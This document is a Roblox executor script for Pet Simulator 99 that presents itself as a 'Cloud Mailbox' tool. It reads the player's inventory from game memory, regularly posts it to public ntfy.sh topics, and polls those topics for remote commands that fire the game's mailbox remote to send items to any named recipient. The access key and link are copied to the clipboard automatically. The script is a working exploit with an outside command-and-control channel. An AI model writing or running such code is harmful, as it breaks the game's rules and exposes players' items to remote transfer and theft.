repeat task.wait() until game:IsLoaded()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local LocalPlayer = Players.LocalPlayer
while not LocalPlayer do
    Players.PlayerAdded:Wait()
    LocalPlayer = Players.LocalPlayer
end

local getgenv = getgenv or function() return _G end
local env = getgenv()
if env.PS99CloudMailboxCleanup then
    pcall(env.PS99CloudMailboxCleanup)
end

local CloudRunning = true
local WEB_BASE_URL = "https://kvires-ps99-cloud.static.hf.space"
local KEY_FILE = "ps99_cloud_key73.txt"

local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or (delta and delta.request) or request

local function doHttp(url, method, headers, body)
    if httpRequest then
        local ok, res = pcall(function()
            return httpRequest({
                Url = url,
                Method = method or "GET",
                Headers = headers or {},
                Body = body
            })
        end)
        if ok and type(res) == "table" then
            local code = tonumber(res.StatusCode or res.Status or res.status) or 200
            local rbody = res.Body or res.body or ""
            return code, tostring(rbody)
        end
    end
    if (method or "GET") == "GET" then
        local ok, bodyStr = pcall(function()
            return game:HttpGet(url)
        end)
        if ok and bodyStr then
            return 200, tostring(bodyStr)
        end
    end
    return 0, ""
end

local function copyToClipboardSafe(text)
    local clipFn = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
    if clipFn then
        return pcall(clipFn, tostring(text))
    end
    return false
end

local function bindMobileButton(btn, callback)
    local busy = false
    local lastClick = 0
    local function trigger()
        local now = tick()
        if busy or (now - lastClick < 0.25) then return end
        busy = true
        lastClick = now
        task.spawn(function()
            pcall(callback)
            task.wait(0.05)
            busy = false
        end)
    end
    btn.Activated:Connect(trigger)
    btn.MouseButton1Click:Connect(trigger)
end

local function generate73Key()
    local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    local t = {}
    math.randomseed(math.floor(tick() * 1000) + LocalPlayer.UserId)
    for i = 1, 73 do
        local idx = math.random(1, #chars)
        t[i] = string.sub(chars, idx, idx)
    end
    return table.concat(t)
end

local function loadOrCreate73Key()
    local custom = (type(env.CloudKey) == "string" and env.CloudKey) or (type(_G.CloudKey) == "string" and _G.CloudKey)
    if custom and #custom == 73 then
        return custom
    end
    if readfile and isfile then
        local ok, saved = pcall(function()
            if isfile(KEY_FILE) then
                return readfile(KEY_FILE)
            end
            return nil
        end)
        if ok and type(saved) == "string" then
            saved = string.gsub(saved, "%s+", "")
            if #saved == 73 then
                return saved
            end
        end
    end
    local newKey = generate73Key()
    if writefile then
        pcall(function() writefile(KEY_FILE, newKey) end)
    end
    return newKey
end

local AccessKey73 = loadOrCreate73Key()
local SecretWebLink = WEB_BASE_URL .. "/?key=" .. AccessKey73
local TopicState = "ps99_st_" .. string.sub(AccessKey73, 1, 48)
local TopicCmd = "ps99_cmd_" .. string.sub(AccessKey73, 1, 48)

copyToClipboardSafe(SecretWebLink)

local DirectoryAssetCache = {}
local ResolvedCdnUrlCache = {}
local PlayerAvatarUrl = nil

local function scanDirectoryForIcons()
    pcall(function()
        local lib = ReplicatedStorage:FindFirstChild("Library")
        local dirMod = lib and lib:FindFirstChild("Directory")
        if dirMod then
            local okReq, dir = pcall(require, dirMod)
            if okReq and type(dir) == "table" then
                for _, catTable in pairs(dir) do
                    if type(catTable) == "table" then
                        for itemId, info in pairs(catTable) do
                            if type(info) == "table" then
                                local icon = rawget(info, "thumbnail") or rawget(info, "icon") or rawget(info, "goldenThumbnail")
                                if type(icon) == "string" then
                                    local numId = string.match(icon, "%d+")
                                    if numId then
                                        DirectoryAssetCache[string.lower(tostring(itemId))] = numId
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end)
    if next(DirectoryAssetCache) == nil and getgc then
        pcall(function()
            for _, v in ipairs(getgc(true)) do
                if type(v) == "table" then
                    local id = rawget(v, "_id") or rawget(v, "id")
                    local thumb = rawget(v, "thumbnail") or rawget(v, "icon")
                    if type(id) == "string" and type(thumb) == "string" then
                        local numId = string.match(thumb, "%d+")
                        if numId then
                            DirectoryAssetCache[string.lower(id)] = numId
                        end
                    end
                end
            end
        end)
    end
end
task.spawn(scanDirectoryForIcons)

local function resolveBatchAssetThumbs(assetIds)
    local toFetch = {}
    local seen = {}
    for _, aid in ipairs(assetIds) do
        if aid and not ResolvedCdnUrlCache[aid] and not seen[aid] then
            seen[aid] = true
            table.insert(toFetch, aid)
            if #toFetch >= 45 then break end
        end
    end
    if #toFetch == 0 then return end
    local url = "https://thumbnails.roblox.com/v1/assets?assetIds=" .. table.concat(toFetch, ",") .. "&returnPolicy=PlaceHolder&size=150x150&format=Png&isCircular=false"
    local code, body = doHttp(url, "GET")
    if code == 200 and body ~= "" then
        pcall(function()
            local decoded = HttpService:JSONDecode(body)
            if decoded and type(decoded.data) == "table" then
                for _, entry in ipairs(decoded.data) do
                    local tid = tostring(entry.targetId or "")
                    local img = entry.imageUrl
                    if tid ~= "" and type(img) == "string" and img ~= "" then
                        ResolvedCdnUrlCache[tid] = img
                    end
                end
            end
        end)
    end
end

local function resolveMyAvatar()
    if PlayerAvatarUrl then return PlayerAvatarUrl end
    local url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(LocalPlayer.UserId) .. "&size=150x150&format=Png&isCircular=true"
    local code, body = doHttp(url, "GET")
    if code == 200 and body ~= "" then
        pcall(function()
            local decoded = HttpService:JSONDecode(body)
            if decoded and type(decoded.data) == "table" and decoded.data[1] and decoded.data[1].imageUrl then
                PlayerAvatarUrl = decoded.data[1].imageUrl
            end
        end)
    end
    return PlayerAvatarUrl
end

local CachedGcInv = nil

local function collectFullInventory()
    local itemsList = {}
    local diamonds = 0
    local lollipops = 0
    local neededAssets = {}

    pcall(function()
        local inv = CachedGcInv
        if type(inv) ~= "table" or next(inv) == nil then
            local lib = ReplicatedStorage:FindFirstChild("Library")
            local client = lib and lib:FindFirstChild("Client")
            local saveMod = client and client:FindFirstChild("Save")
            if saveMod then
                local okS, saveObj = pcall(require, saveMod)
                if okS and type(saveObj) == "table" and type(saveObj.Get) == "function" then
                    local data = saveObj.Get()
                    inv = type(data) == "table" and rawget(data, "Inventory")
                end
            end
        end
        if (type(inv) ~= "table" or next(inv) == nil) and getgc then
            for _, v in ipairs(getgc(true)) do
                if type(v) == "table" then
                    local testInv = rawget(v, "Inventory")
                    if type(testInv) == "table" and type(rawget(testInv, "Pet")) == "table" and next(rawget(testInv, "Pet")) ~= nil then
                        inv = testInv
                        CachedGcInv = testInv
                        break
                    end
                end
            end
        end
        if type(inv) == "table" then
            for catName, catTab in pairs(inv) do
                if type(catTab) == "table" then
                    for uid, obj in pairs(catTab) do
                        if type(obj) == "table" then
                            local d = rawget(obj, "_data")
                            if type(d) ~= "table" then d = obj end
                            local idVal = rawget(d, "id") or rawget(d, "Id")
                            local amt = tonumber(rawget(d, "_am")) or tonumber(rawget(d, "amount")) or 1
                            local pt = tonumber(rawget(d, "pt")) or 0
                            local sh = rawget(d, "sh") == true
                            if type(idVal) == "string" then
                                local idLow = string.lower(idVal)
                                if catName == "Currency" then
                                    if idLow == "diamonds" then diamonds = amt
                                    elseif string.find(idLow, "lollipop") then lollipops = amt end
                                else
                                    if string.find(idLow, "lollipop") and amt > lollipops then
                                        lollipops = amt
                                    end
                                    local aid = DirectoryAssetCache[idLow]
                                    if aid and not ResolvedCdnUrlCache[aid] then
                                        table.insert(neededAssets, aid)
                                    end
                                    table.insert(itemsList, {
                                        uid = tostring(uid),
                                        id = idVal,
                                        cat = tostring(catName),
                                        am = amt,
                                        pt = pt,
                                        sh = sh,
                                        aid = aid
                                    })
                                end
                            end
                        end
                    end
                end
            end
        end
    end)

    if #neededAssets > 0 then
        resolveBatchAssetThumbs(neededAssets)
    end

    for _, it in ipairs(itemsList) do
        if it.aid and ResolvedCdnUrlCache[it.aid] then
            it.icon = ResolvedCdnUrlCache[it.aid]
        end
        it.aid = nil
    end

    table.sort(itemsList, function(a, b)
        return (a.am or 1) > (b.am or 1)
    end)

    if #itemsList > 250 then
        local trimmed = {}
        for i = 1, 250 do trimmed[i] = itemsList[i] end
        itemsList = trimmed
    end

    return itemsList, diamonds, lollipops
end

local function findMailboxSendRemote()
    local net = ReplicatedStorage:FindFirstChild("Network") or ReplicatedStorage:FindFirstChild("Packages")
    if net then
        for _, r in ipairs(net:GetDescendants()) do
            if r:IsA("RemoteFunction") or r:IsA("RemoteEvent") then
                local low = string.lower(r.Name)
                if low == "mailbox: send" or low == "mailbox_send" then
                    return r
                end
            end
        end
    end
    return nil
end

local ProcessedTasks = {}
local StatusLabelRef = nil

local function executeMailboxTask(taskData)
    if type(taskData) ~= "table" or not taskData.task_id then return end
    local tid = tostring(taskData.task_id)
    if ProcessedTasks[tid] then return end
    if tostring(taskData.sender or "") ~= LocalPlayer.Name then return end
    ProcessedTasks[tid] = true

    local recipient = tostring(taskData.recipient or "")
    local category = tostring(taskData.category or "Pet")
    local itemUid = tostring(taskData.uid or "")
    local itemId = tostring(taskData.item_id or "")
    local amount = math.max(1, math.floor(tonumber(taskData.amount) or 1))
    local msg = tostring(taskData.message or "Gift")

    if StatusLabelRef then
        StatusLabelRef.Text = "📮 Отправка: " .. itemId .. " x" .. tostring(amount) .. " -> " .. recipient
    end

    local mailRemote = findMailboxSendRemote()
    local success = false
    local resultMsg = "Remote Mailbox: Send не найден"

    if mailRemote then
        local ok, r1, r2 = pcall(function()
            if mailRemote:IsA("RemoteFunction") then
                return mailRemote:InvokeServer(recipient, msg, category, itemUid, amount)
            else
                mailRemote:FireServer(recipient, msg, category, itemUid, amount)
                return true, "Отправлено"
            end
        end)
        if ok and r1 == true then
            success = true
            resultMsg = "Успешно отправлено игроку " .. recipient .. "!"
        else
            success = false
            resultMsg = tostring(r2 or r1 or "Ошибка отправки в игре")
        end
    end

    if StatusLabelRef then
        StatusLabelRef.Text = success and ("✅ Отправлено -> " .. recipient) or ("❌ Ошибка: " .. resultMsg)
    end

    local replyPayload = HttpService:JSONEncode({
        type = "mail_result",
        task_id = tid,
        sender = LocalPlayer.Name,
        recipient = recipient,
        category = category,
        item_id = itemId,
        amount = amount,
        status = success and "sent" or "failed",
        result_text = resultMsg,
        ts = os.time()
    })
    doHttp("https://ntfy.sh/" .. TopicCmd, "POST", { ["Content-Type"] = "application/json" }, replyPayload)
end

local function syncStateToCloud()
    local items, diamonds, lollipops = collectFullInventory()
    local avatar = resolveMyAvatar()
    if StatusLabelRef then
        StatusLabelRef.Text = string.format("🟢 В сети | Стеков: %d | 🍭 %d", #items, lollipops)
    end
    local payload = HttpService:JSONEncode({
        username = LocalPlayer.Name,
        user_id = LocalPlayer.UserId,
        avatar_url = avatar,
        diamonds = diamonds,
        lollipops = lollipops,
        items = items,
        ts = os.time()
    })
    doHttp("https://ntfy.sh/" .. TopicState, "POST", { ["Content-Type"] = "application/json" }, payload)
end

local function pollCloudCommands()
    local code, body = doHttp("https://ntfy.sh/" .. TopicCmd .. "/json?poll=1&since=45s", "GET")
    if code == 200 and type(body) == "string" and body ~= "" then
        for line in string.gmatch(body, "[^\r\n]+") do
            pcall(function()
                local envObj = HttpService:JSONDecode(line)
                if envObj and envObj.event == "message" and type(envObj.message) == "string" then
                    local cmd = HttpService:JSONDecode(envObj.message)
                    if cmd and cmd.type == "send_mail" then
                        executeMailboxTask(cmd)
                        task.wait(0.4)
                        syncStateToCloud()
                    end
                end
            end)
        end
    end
end

local ParentGui = (gethui and gethui()) or game:GetService("CoreGui")
pcall(function()
    local _ = ParentGui.Name
end)
if not ParentGui then
    ParentGui = LocalPlayer:WaitForChild("PlayerGui")
end

local OldBar = ParentGui:FindFirstChild("PS99CloudMailboxMobile")
if OldBar then OldBar:Destroy() end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "PS99CloudMailboxMobile"
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = ParentGui

local MainCard = Instance.new("Frame")
MainCard.Size = UDim2.new(0, 300, 0, 128)
MainCard.Position = UDim2.new(0.5, -150, 0, 10)
MainCard.BackgroundColor3 = Color3.fromRGB(15, 18, 30)
MainCard.BorderSizePixel = 0
MainCard.Active = true
MainCard.Parent = ScreenGui

local CardCorner = Instance.new("UICorner")
CardCorner.CornerRadius = UDim.new(0, 12)
CardCorner.Parent = MainCard

local CardStroke = Instance.new("UIStroke")
CardStroke.Color = Color3.fromRGB(255, 140, 36)
CardStroke.Thickness = 1.6
CardStroke.Parent = MainCard

local TopHeader = Instance.new("Frame")
TopHeader.Size = UDim2.new(1, 0, 0, 28)
TopHeader.BackgroundColor3 = Color3.fromRGB(22, 27, 44)
TopHeader.BorderSizePixel = 0
TopHeader.Parent = MainCard

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 12)
HeaderCorner.Parent = TopHeader

local TitleLbl = Instance.new("TextLabel")
TitleLbl.Size = UDim2.new(1, -44, 1, 0)
TitleLbl.Position = UDim2.new(0, 10, 0, 0)
TitleLbl.BackgroundTransparency = 1
TitleLbl.Font = Enum.Font.GothamBold
TitleLbl.TextSize = 12
TitleLbl.TextColor3 = Color3.fromRGB(255, 165, 50)
TitleLbl.TextXAlignment = Enum.TextXAlignment.Left
TitleLbl.Text = "📱 PS99 Cloud Mailbox (Mobile)"
TitleLbl.Parent = TopHeader

local MinBtn = Instance.new("TextButton")
MinBtn.Size = UDim2.new(0, 28, 0, 22)
MinBtn.Position = UDim2.new(1, -32, 0, 3)
MinBtn.BackgroundColor3 = Color3.fromRGB(35, 42, 68)
MinBtn.Font = Enum.Font.GothamBold
MinBtn.TextSize = 12
MinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
MinBtn.Text = "—"
MinBtn.Parent = TopHeader

local MinCorner = Instance.new("UICorner")
MinCorner.CornerRadius = UDim.new(0, 6)
MinCorner.Parent = MinBtn

local BodyFrame = Instance.new("Frame")
BodyFrame.Size = UDim2.new(1, -16, 1, -34)
BodyFrame.Position = UDim2.new(0, 8, 0, 31)
BodyFrame.BackgroundTransparency = 1
BodyFrame.Parent = MainCard

local StatusLbl = Instance.new("TextLabel")
StatusLbl.Size = UDim2.new(1, 0, 0, 18)
StatusLbl.BackgroundTransparency = 1
StatusLbl.Font = Enum.Font.GothamBold
StatusLbl.TextSize = 11
StatusLbl.TextColor3 = Color3.fromRGB(34, 229, 139)
StatusLbl.TextXAlignment = Enum.TextXAlignment.Left
StatusLbl.Text = "🟢 Подключение к облаку..."
StatusLbl.Parent = BodyFrame
StatusLabelRef = StatusLbl

local KeyBox = Instance.new("TextBox")
KeyBox.Size = UDim2.new(1, 0, 0, 26)
KeyBox.Position = UDim2.new(0, 0, 0, 22)
KeyBox.BackgroundColor3 = Color3.fromRGB(10, 12, 20)
KeyBox.Font = Enum.Font.Code
KeyBox.TextSize = 10
KeyBox.TextColor3 = Color3.fromRGB(210, 220, 255)
KeyBox.ClearTextOnFocus = false
KeyBox.TextEditable = false
KeyBox.Text = AccessKey73
KeyBox.Parent = BodyFrame

local KeyBoxCorner = Instance.new("UICorner")
KeyBoxCorner.CornerRadius = UDim.new(0, 6)
KeyBoxCorner.Parent = KeyBox

local CopyKeyBtn = Instance.new("TextButton")
CopyKeyBtn.Size = UDim2.new(0.48, 0, 0, 34)
CopyKeyBtn.Position = UDim2.new(0, 0, 0, 54)
CopyKeyBtn.BackgroundColor3 = Color3.fromRGB(45, 55, 90)
CopyKeyBtn.Font = Enum.Font.GothamBold
CopyKeyBtn.TextSize = 11
CopyKeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyKeyBtn.Text = "🔑 Копировать ключ"
CopyKeyBtn.Parent = BodyFrame

local CKCorner = Instance.new("UICorner")
CKCorner.CornerRadius = UDim.new(0, 8)
CKCorner.Parent = CopyKeyBtn

local CopyLinkBtn = Instance.new("TextButton")
CopyLinkBtn.Size = UDim2.new(0.50, 0, 0, 34)
CopyLinkBtn.Position = UDim2.new(0.50, 0, 0, 54)
CopyLinkBtn.BackgroundColor3 = Color3.fromRGB(255, 140, 36)
CopyLinkBtn.Font = Enum.Font.GothamBold
CopyLinkBtn.TextSize = 11
CopyLinkBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyLinkBtn.Text = "🔗 Копировать ссылку"
CopyLinkBtn.Parent = BodyFrame

local CLCorner = Instance.new("UICorner")
CLCorner.CornerRadius = UDim.new(0, 8)
CLCorner.Parent = CopyLinkBtn

bindMobileButton(CopyKeyBtn, function()
    copyToClipboardSafe(AccessKey73)
    CopyKeyBtn.Text = "✅ Ключ скопирован!"
    task.delay(1.8, function()
        if CopyKeyBtn and CopyKeyBtn.Parent then
            CopyKeyBtn.Text = "🔑 Копировать ключ"
        end
    end)
end)

bindMobileButton(CopyLinkBtn, function()
    copyToClipboardSafe(SecretWebLink)
    CopyLinkBtn.Text = "✅ Ссылка скопирована!"
    task.delay(1.8, function()
        if CopyLinkBtn and CopyLinkBtn.Parent then
            CopyLinkBtn.Text = "🔗 Копировать ссылку"
        end
    end)
end)

local isMinimized = false
bindMobileButton(MinBtn, function()
    isMinimized = not isMinimized
    BodyFrame.Visible = not isMinimized
    MainCard.Size = isMinimized and UDim2.new(0, 220, 0, 28) or UDim2.new(0, 300, 0, 128)
    MinBtn.Text = isMinimized and "+" or "—"
end)

do
    local dragging = false
    local dragInput = nil
    local dragStart = nil
    local startPos = nil
    TopHeader.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = MainCard.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    TopHeader.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging and dragStart and startPos then
            local delta = input.Position - dragStart
            MainCard.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

env.PS99CloudMailboxCleanup = function()
    CloudRunning = false
    pcall(function() ScreenGui:Destroy() end)
end

task.spawn(function()
    task.wait(0.8)
    scanDirectoryForIcons()
    pcall(syncStateToCloud)
    local lastFullSync = tick()
    while CloudRunning do
        task.wait(3.5)
        pcall(pollCloudCommands)
        if tick() - lastFullSync >= 14 then
            lastFullSync = tick()
            pcall(syncStateToCloud)
        end
    end
end)
